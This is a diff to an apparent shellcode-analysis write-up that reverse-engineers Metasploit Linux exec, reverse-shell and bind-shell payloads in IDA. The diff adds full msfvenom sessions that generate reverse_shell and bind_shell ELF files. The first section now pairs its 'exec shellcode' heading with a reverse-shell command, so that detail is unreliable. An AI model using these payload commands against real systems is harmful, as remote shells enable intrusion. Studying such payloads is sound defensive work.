@@ -19,7 +19,13 @@ Now, let's get to work.
 ### Reverse the the code using IDA
 The first shellcode, I decided to analyse, is a simple exec shellcode. This shellcode can be generated using msfvenom:
 ```console
-#msfvenom -p linux/x86/exec CMD=id -f elf -o exec 
+kali@kali:/tmp$ msfvenom -p linux/x86/shell_reverse_tcp -f elf -o reverse_shell 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of elf file: 152 bytes
+Saved as: reverse_shell 
 ``` 
 We will use IDA to understand how the assembly of this shellcode works:
 
@@ -39,7 +45,13 @@ Based on the above code, this shellcode only use one systemcall. This shellcode 
 ### Reverse the the code using IDA 
 The second shellcode, I decided to analyse, is a tcp reverse shell. This shellcode can be generated using msfvenom:
 ```console
-#msfvenom -p linux/x86/shell_reverse_tcp -f elf -o reverse_shell 
+kali@kali:/tmp$ msfvenom -p linux/x86/shell_reverse_tcp -f elf -o reverse_shell
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of elf file: 152 bytes
+Saved as: reverse_shell
 ``` 
 
 We will use IDA to understand how the assembly of this shellcode works:
@@ -107,7 +119,13 @@ The parameters of this syscall can be found below:
 ### Reverse the the code using IDA
 The last shellcode, I decided to analyse, is a tcp bind shell. This shellcode can be generated using msfvenom:
 ```console
-#msfvenom -p linux/x86/linux/x86/shell_bind_tcp -f elf -o bind_shell 
+kali@kali:/tmp$ msfvenom -p linux/x86/shell_bind_tcp -f elf -o bind_shell 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 78 bytes
+Final size of elf file: 162 bytes
+Saved as: bind_shell
 ```
 
 We will use IDA to understand how the assembly of this shellcode works:
